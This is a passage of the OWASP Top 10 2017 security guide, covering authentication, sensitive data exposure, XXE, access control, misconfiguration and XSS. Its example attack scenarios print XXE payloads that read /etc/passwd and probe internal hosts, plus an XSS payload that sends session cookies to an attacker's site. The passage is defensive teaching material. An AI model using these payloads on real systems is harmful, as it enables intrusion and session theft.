<p><strong>Scenario #1</strong>: <a href="https://www.owasp.org/index.php/Credential_stuffing">credential stuffing</a>, the use of <a href="https://github.com/danielmiessler/SecLists">lists of known passwords</a>, is a common attack. If an application does not rate limit authentication attempts, the application can be used as a password oracle to determine if the credentials are valid.</p>
<p><strong>Scenario #2</strong>: Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements are viewed as encouraging users to use, and reuse, weak passwords. Organizations are recommended to stop these practices per NIST 800-63 and use multi-factor authentication.</p>
<p><strong>Scenario #3</strong>: Insecure password storage (including plain text, reversibly encrypted passwords, and weakly hashed passwords (such as using MD5/SHA1 with or without a salt) can lead to breaches. A recent effort by a small group of researchers cracked <a href="https://cynosureprime.blogspot.com.au/2017/08/320-million-hashes-exposed.html">320 million passwords in less than three weeks</a>, including long passwords. Instead use modern hashing algorithms such as Argon2, with salting and sufficient work factor to prevent the use of rainbow tables, word lists, etc.</p>
<h2 id="references-2">References</h2>
<h3 id="owasp-2">OWASP</h3>
<ul>
<li><a href="(https://www.owasp.org/index.php/OWASP_Proactive_Controls#5:_Implement_Identity_and_Authentication_Controls)">OWASP Proactive Controls - Implement Identity and Authentication Controls</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard V2 Authentication</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard V3 Session Management</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_Identity_Management">OWASP Testing Guide: Identity</a><br />
and <a href="https://www.owasp.org/index.php/Testing_for_authentication">Authentication</a></li>
<li><a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet">OWASP Authentication Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Credential_Stuffing_Prevention_Cheat_Sheet">OWASP Credential Stuffing Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet">OWASP Forgot Password Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet">OWASP Password Storage Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet">OWASP Session Management Cheat Sheet</a></li>
</ul>
<h3 id="external-2">External</h3>
<ul>
<li><a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63b 5.1.1 Memorized Secrets – for thorough, modern, evidence based advice on authentication.</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287 Improper Authentication</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384 Session Fixation</a></li>
</ul>
<h1 id="a32017-sensitive-data-exposure">A3:2017 Sensitive Data Exposure</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 2</td>
<td style="text-align: left;">Prevalence 3 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Even anonymous attackers typically don’t break crypto directly. They break something else, such as steal keys, do man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user’s client, e.g. browser. Manual attack is generally required.</td>
<td style="text-align: left;">Over the last few years, this has been the most common impactful attack. The most common flaw is simply not encrypting sensitive data. When crypto is employed, weak key generation and management, and weak algorithm usage is common, particularly weak password hashing techniques. For data in transit server side weaknesses are mainly easy to detect, but hard for data in rest. Both with very varying exploitability.</td>
<td style="text-align: left;">Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive personal information (PII) data such as health records, credentials, personal data, credit cards, which often requires protection as defined by laws or regulations such as the EU GDPR or local privacy laws.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-data-exposure">Am I Vulnerable to Data Exposure?</h2>
<p>The first thing is to determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, and personal information require extra protection, particularly if that data falls under the EU's General Data Protection Regulation (GDPR), local privacy laws or regulations, financial data protection regulations and laws, such as PCI Data Security Standard (PCI DSS), or health records laws, such as Portability Act (HIIPA). For all such data:</p>
<ul>
<li>Is any data of a site transmitted in clear text, internally or externally? Internet traffic is especially dangerous, but from load balancers to web servers or from web servers to back end systems can be problematic.</li>
<li>Is sensitive data stored in clear text, including backups?<br />
Are any old or weak cryptographic algorithms used either by default or in older code? (see A6:2017 Security Misconfiguration)</li>
<li>Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing?</li>
<li>Is encryption not enforced, e.g. are any user agent (browser) security directives or headers missing?</li>
</ul>
<p>See ASVS areas <a href="https://www.owasp.org/index.php/ASVS">Crypto (V7), Data Protection (V9) and SSL/TLS (V10)</a></p>
<h2 id="how-do-i-prevent-this-1">How Do I Prevent This?</h2>
<p>Do the following, at a minimum and consult the references:</p>
<ul>
<li>Classify data processed, stored or transmitted by a system. Apply controls as per the classification.<br />
Review the privacy laws or regulations applicable to sensitive data, and protect as per regulatory requirements</li>
<li>Don’t store sensitive data unnecessarily. Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation. Data you don’t retain can’t be stolen.</li>
<li>Make sure you encrypt all sensitive data at rest </li>
<li>Encrypt all data in transit, such as using TLS. Enforce this using directives like HTTP Strict Transport Security (HSTS).</li>
<li>Ensure up-to-date and strong standard algorithms or ciphers, parameters, protocols and keys are used, and proper key management is in place. Consider using <a href="http://csrc.nist.gov/groups/STM/cmvp/documents/140-1/140val-all.htm">crypto modules</a>.</li>
<li>Ensure passwords are stored with a strong adaptive algorithm appropriate for password protection, such as <a href="https://www.cryptolux.org/index.php/Argon2">Argon2</a>, <a href="http://en.wikipedia.org/wiki/Scrypt">scrypt</a>, <a href="http://en.wikipedia.org/wiki/Bcrypt">bcrypt</a> and <a href="http://en.wikipedia.org/wiki/PBKDF2">PBKDF2</a>. Configure the work factor (delay factor) as high as you can tolerate.</li>
<li>Disable caching for response that contain sensitive data.<br />
Verify independently the effectiveness of your settings.</li>
</ul>
<h2 id="example-attack-scenarios-2">Example Attack Scenarios</h2>
<p><strong>Scenario #1</strong>:  An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. </p>
<p><strong>Scenario #2</strong>: A site doesn't use or enforce TLS for all pages, or if it supports weak encryption. An attacker simply monitors network traffic, strips or intercepts the TLS (like an open wireless network), and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the user's private data. Instead of the above he could alter all transported data, e.g. the recipient of a money transfer.</p>
<p><strong>Scenario #3</strong>: The password database uses unsalted hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes.</p>
<h2 id="references-3">References</h2>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#7:_Protect_Data">OWASP Proactive Controls - Protect Data</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard - V9, V10, V11</a></li>
<li><a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet">OWASP Cheat Sheet - Transport Layer Protection</a></li>
<li><a href="https://www.owasp.org/index.php/User_Privacy_Protection_Cheat_Sheet">OWASP Cheat Sheet - User Privacy Protection</a></li>
<li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet">OWASP Cheat Sheet - Password Storage</a></li>
<li><a href="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet">OWASP Cheat Sheet - Cryptographic Storage</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">OWASP Security Headers Project</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_weak_Cryptography">OWASP Testing Guide - Testing for weak cryptography</a></li>
</ul>
<h3 id="external-3">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/359.html">CWE-359 Exposure of Private Information - Privacy Violation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/220.html">CWE-220 Exposure of sens. information through data queries</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/310.html">CWE-310 Cryptographic Issues</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312 Cleartext Storage of Sensitive Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319 Cleartext Transmission of Sensitive Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326 Weak Encryption</a></li>
</ul>
<h1 id="a42017-xml-external-entities-xxe">A4:2017 XML External Entities (XXE)</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 2</td>
<td style="text-align: left;">Prevalence 2 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Attackers who can access web pages or web services, particularly SOAP web services, that process XML. Penetration testers should be capable of exploiting XXE once trained. DAST tools require additional manual steps to exploit this issue.</td>
<td style="text-align: left;">By default, many older XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. SAST tools can discover this issue by inspecting dependencies and configuration.</td>
<td style="text-align: left;">These flaws can be used to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, and other attacks. The business impact depends on the protection needs of all affected applications and data.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-xxe">Am I Vulnerable to XXE?</h2>
<p>Applications and in particular XML-based web services or downstream integrations might be vulnerable to attack if:</p>
<ul>
<li>Your application accepts XML directly or XML uploads, especially from untrusted sources, or inserts untrusted data into XML documents, which is then parsed by an XML processor</li>
<li>Any of the XML processors in the application or SOAP based web services has <a href="https://en.wikipedia.org/wiki/Document_type_definition">document type definitions (DTDs)</a> enabled. As the exact mechanism for disabling DTD processing varies by processor, it is recommended that you consult a reference such as the <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">OWASP XXE Prevention Cheat Sheet</a>.</li>
<li>If your application uses SOAP prior to version 1.2, it is likely susceptible to XXE attacks if XML entities are being passed to the SOAP framework.</li>
<li>SAST tools can help detect XXE in source code, although manual code review is the best alternative in large, complex apps with many integrations.</li>
<li>Being vulnerable to XXE attacks likely means that you are vulnerable to other billion laughs denial-of-service attacks.</li>
</ul>
<h2 id="how-do-i-prevent-this-2">How Do I Prevent This?</h2>
<p>Developer training is essential to identify and mitigate XXE completely. Besides that, preventing XXE requires:</p>
<ul>
<li>Disable XML external entity and DTD processing in all XML parsers in your application, as per the <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">OWASP XXE Prevention Cheat Sheet</a>.</li>
<li>Implement positive (&quot;white listing&quot;) input validation, filtering, or sanitization to prevent hostile data within XML documents, headers, or nodes.</li>
<li>Verify that XML or XSL file upload functionality validates incoming XML using XSD validation or similar.</li>
<li>Patch or upgrade all the latest XML processors and libraries in use by the app or on the underlying operating system. The use of dependency checkers is critical in managing the risk from necessary libraries and components in not only your app, but any downstream integrations.</li>
<li>Upgrade SOAP to the latest version.</li>
</ul>
<p>If these controls are not possible, consider using virtual patching, API security gateways, or WAFs to detect, monitor, and block XXE attacks. </p>
<h2 id="example-attack-scenarios-3">Example Attack Scenarios</h2>
<p>Numerous public XXE issues have been discovered, including attacking embedded devices. XXE occurs in a lot of unexpected places, including deeply nested dependencies. The easiest way is to upload a malicious XML file, if accepted:</p>
<p><strong>Scenario #1</strong>: The attacker  attempts to extract data from the server:</p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
    &lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
<p><strong>Scenario #2</strong>: An attacker probes the server's private network by changing the above ENTITY line to:</p>
<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code></pre>
<p><strong>Scenario #3</strong>: An attacker attempts a denial-of-service attack by including a potentially endless file:</p>
<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
<h2 id="references-4">References</h2>
<h3 id="owasp-3">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)">OWASP Testing Guide - Testing for XML Injection</a></li>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">OWASP XXE Vulnerability</a></li>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">OWASP XXE Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/XML_Security_Cheat_Sheet">OWASP XML Security Cheat Sheet</a></li>
</ul>
<h3 id="external-4">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611 Improper Restriction of XXE</a></li>
<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs Attack</a></li>
</ul>
<h1 id="a52017-broken-access-control">A5:2017 Broken Access Control</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 2</td>
<td style="text-align: left;">Prevalence 2 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Exploitation of access control is a core skill of penetration testers. SAST and DAST tools can detect the absence of access control, but not verify if it is functional. Access control is detectable using manual means, or possibly through automation for the absence of access controls in certain frameworks.</td>
<td style="text-align: left;">Access control weaknesses are common due to the lack of automated detection, and lack of effective functional testing by application developers. Access control detection is not typically amenable to automated static or dynamic testing.</td>
<td style="text-align: left;">The technical impact is anonymous attackers acting as users or administrators, users using privileged functions, or creating, accessing, updating or deleting every record.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-broken-access-ctl">Am I Vulnerable to Broken Access Ctl?</h2>
<p>Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:</p>
<ul>
<li>Bypassing access control checks by modifying the URL, internal app state, or the HTML page, or simply using a custom API attack tool.</li>
<li>Allowing the primary key to be changed to another's users record, such as viewing or editing someone else's account.</li>
<li>Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.</li>
<li>Metadata manipulation, such as replaying or tampering with a JWT access control token or a cookie or hidden field manipulated to elevate privileges.</li>
<li>CORS misconfiguration allows unauthorized API access</li>
<li>Force browsing to authenticated pages as an unauthenticated user, or to privileged pages as a standard user or API not enforcing access controls for POST, PUT and DELETE</li>
</ul>
<h2 id="how-do-i-prevent-this-3">How Do I Prevent This?</h2>
<p>Access control is only effective if enforced in trusted server-side code or server-less API, where the attacker cannot modify the access control check or metadata.</p>
<ul>
<li>With the exception of public resources, deny by default.<br />
Implement access control mechanisms once and re-use them throughout the application.</li>
<li>Model access controls should enforce record ownership, rather than accepting that the user can create, read, update or delete any record.</li>
<li>Domain access controls are unique to each application, but business limit requirements should be enforced by domain models</li>
<li>Disable web server directory listing, and ensure file metadata such (e.g. .git) is not present within web roots</li>
<li>Log access control failures, alert admins when appropriate (e.g. repeated failures)</li>
<li>Rate limiting API and controller access to minimize the harm from automated attack tooling</li>
<li>Developers and QA staff should include functional access control unit and integration tests.</li>
</ul>
<h2 id="example-attack-scenarios-4">Example Attack Scenarios</h2>
<p><strong>Scenario #1</strong>: The application uses unverified data in a SQL call that is accessing account information:</p>
<pre><code>  pstmt.setString(1, request.getParameter(&quot;acct&quot;));
  ResultSet results = pstmt.executeQuery( );</code></pre>
<p>An attacker simply modifies the 'acct' parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user's account.</p>
<ul>
<li><code>http://example.com/app/accountInfo?acct=notmyacct</code></li>
</ul>
<p><strong>Scenario #2</strong>:  An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.</p>
<ul>
<li><code>http://example.com/app/getappInfo</code></li>
<li><code>http://example.com/app/admin_getappInfo</code></li>
</ul>
<p>If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.</p>
<h2 id="references-5">References</h2>
<h3 id="owasp-4">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#6:_Implement_Access_Controls">OWASP Proactive Controls - Access Controls</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - V4 Access Control</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Authorization">OWASP Testing Guide - Access Control</a></li>
<li><a href="https://www.owasp.org/index.php/Access_Control_Cheat_Sheet">OWASP Cheat Sheet - Access Control</a></li>
</ul>
<h3 id="external-5">External</h3>
<ul>
<li><a href="">CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284 Improper Access Control (Authorization)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285 Improper Authorization</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639 Authorization Bypass Through User-Controlled Key</a></li>
<li><a href="https://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html">Exploiting CORS misconfiguration</a></li>
</ul>
<h1 id="a62017-security-misconfiguration">A6:2017 Security Misconfiguration</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 3</td>
<td style="text-align: left;">Prevalence 3 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Even anonymous attackers can try to access default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system.</td>
<td style="text-align: left;">Security misconfiguration can happen at any level of an application stack, including the platform, web server, application server, database, frameworks, and custom code. Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options etc.</td>
<td style="text-align: left;">Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise. The business impact depends on the protection needs of your application and data.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-security-misconfig">Am I Vulnerable to Security Misconfig?</h2>
<p>Is your application missing the proper security hardening across any part of the application stack? Including:</p>
<ul>
<li>Are any unnecessary features enabled or installed (e.g. ports, services, pages, accounts, privileges)?</li>
<li>Are default accounts and their passwords still enabled and unchanged?</li>
<li>Does your error handling reveal stack traces or other overly informative error messages to users?</li>
<li>Do you still use ancient configs with updated software? Do you continue to support obsolete backward compatibility?</li>
<li>Are the security settings in your application servers, application frameworks (e.g. Struts, Spring, ASP.NET), libraries, databases, etc. not set to secure values?</li>
<li>For web applications, does the server not send security directives to client agents (e.g. <a href="https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet">HSTS</a>) or are they not set to secure values?</li>
<li>Is any of your software out of date? (see A9:2017 Using Components with Known Vulnerabilities)</li>
</ul>
<p>Without a concerted, repeatable application security configuration process, systems are at a higher risk.</p>
<h2 id="how-do-i-prevent-this-4">How Do I Prevent This?</h2>
<p>The primary recommendations are to establish all of the following:</p>
<ul>
<li>A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically (with different credentials used in each environment). This process should be automated to minimize the effort required to setup a new secure environment.</li>
<li>Remove or do not install any unnecessary features, components, documentation and samples. Remove unused dependencies and frameworks.</li>
<li>A process to triage and deploy all updates and patches in a timely manner to each deployed environment. This process needs to include all frameworks, dependencies, components, and libraries (see A9:2017 Using Components with Known Vulnerabilities). </li>
<li>A strong application architecture that provides effective, secure separation between components, with segmentation, containerization, or cloud security groups (ACLs). </li>
<li>An automated process to verify the effectiveness of the configurations and settings in all environments.</li>
</ul>
<h2 id="example-attack-scenarios-5">Example Attack Scenarios</h2>
<p><strong>Scenario #1</strong>: The app server admin console is automatically installed and not removed. Default accounts aren't changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.</p>
<p><strong>Scenario #2</strong>: Directory listing is not disabled on your server. An attacker discovers they can simply list directories to find file. The attacker finds and downloads your compiled Java classes, which they decompile and reverse engineer to get your custom code. Attacker then finds a serious access control flaw in your app.</p>
<p><strong>Scenario #3</strong>: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws such as framework versions that are known to be vulnerable.</p>
<p><strong>Scenario #4</strong>: App server comes with sample apps that are not removed from your production server. These sample apps have known security flaws attackers use to compromise your server.</p>
<p><strong>Scenario #5</strong>: The default configuration or a copied old one activates old vulnerable protocol versions or options that can be misused by an attacker or malware.</p>
<h2 id="references-6">References</h2>
<h3 id="owasp-5">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/Testing_for_configuration_management">OWASP Testing Guide: Configuration Management</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Error_Code_(OWASP-IG-006)">OWASP Testing Guide: Testing for Error Codes</a></li>
</ul>
<p>For additional requirements in this area, see the <a href="https://www.owasp.org/index.php/ASVS">ASVS requirements areas for Security Configuration (V11 and V19)</a>.</p>
<h3 id="external-6">External</h3>
<ul>
<li><a href="http://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-123.pdf">NIST Guide to General Server Hardening</a></li>
<li><a href="http://cwe.mitre.org/data/definitions/2.html">CWE Entry 2 on Environmental Security Flaws</a></li>
<li><a href="http://benchmarks.cisecurity.org/downloads/benchmarks/">CIS Security Configuration Guides/Benchmarks</a></li>
</ul>
<h1 id="a72017-cross-site-scripting-xss">A7:2017 Cross-Site Scripting (XSS)</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 3</td>
<td style="text-align: left;">Prevalence 3 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks.</td>
<td style="text-align: left;">XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET.</td>
<td style="text-align: left;">The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-xss">Am I Vulnerable to XSS?</h2>
<p>Three are three forms of XSS, usually targeting users' browsers:</p>
<ul>
<li><strong>Reflected XSS</strong>: Your app or API includes unvalidated and unescaped user input as part of HTML output or there is no content security policy (<a href="https://www.owasp.org/index.php/Content_Security_Policy">CSP</a>) header. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with a link, or some other attacker controlled page, such as a watering hole attack, malvertizing, or similar.</li>
<li><strong>Stored XSS</strong>: Your app or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.</li>
<li><strong>DOM XSS</strong>: JavaScript frameworks, single page apps, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs.</li>
</ul>
<p>Typical XSS attacks include session stealing, account takeover, MFA bypass, DIV replacement or defacement (such as trojan login DIVs), attacks against the user's browser such as malicious software downloads, key logging, and other client side attacks.</p>
<h2 id="how-do-i-prevent-this-5">How Do I Prevent This?</h2>
<p>Preventing XSS requires separation of untrusted data from active browser content.</p>
<ul>
<li>Use safer frameworks that automatically escape for XSS by design, such as in Ruby 3.0 or React JS.</li>
<li>Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP XSS Prevention Cheat Sheet</a> has details on the required data escaping techniques.</li>
<li>Applying context sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the <a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">OWASP DOM based XSS Prevention Cheat Sheet</a>.</li>
<li>Enabling a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a> is a defense in depth mitigating control against XSS, assuming no other vulnerabilities exist that would allow placing malicious code via local file include such as path traversal overwrites, or vulnerable libraries in permitted sources, such as content delivery network or local libraries. </li>
</ul>
<h2 id="example-attack-scenario">Example Attack Scenario</h2>
<p><strong>Scenario 1</strong>: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p>
<pre><code>   (String) page += &quot;&lt;input name=&#39;creditcard&#39; type=&#39;TEXT&#39; value=&#39;&quot; + request.getParameter(&quot;CC&quot;) + &quot;&#39;&gt;&quot;;</code></pre>
<p>The attacker modifies the 'CC’ parameter in the browser to:</p>
<pre><code>&gt;&lt;script&gt;document.location=&#39;http://www.attacker.com/cgi-bin/cookie.cgi?foo=&#39;+document.cookie&lt;/script&gt;&#39;.</code></pre>
<p>This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.</p>
<p>Note that attackers can use XSS to defeat any automated CSRF defense the application might employ.</p>
<h2 id="references-7">References</h2>
<h3 id="owasp-6">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Proactive Controls - #3 Encode Data</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Proactive Controls - #4 Validate Data</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard - V5</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">OWASP Testing Guide: Testing for Reflected XSS</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">OWASP Testing Guide: Testing for Stored XSS</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">OWASP Testing Guide: Testing for DOM XSS</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">OWASP DOM based XSS Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS Filter Evasion Cheat Sheet</a></li>
</ul>
<h3 id="external-7">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79 Improper neutralization of user supplied input</a></li>
<li><a href="https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection">PortSwigger: Client-side template injection</a></li>
</ul>
<h1 id="a82017-insecure-deserialization">A8:2017 Insecure Deserialization</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 1</td>
<td style="text-align: left;">Prevalence 2 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Exploitation of deserialization is somewhat difficult, as off the shelf exploits rarely work without changes or tweaks to the underlying exploit code. </td>
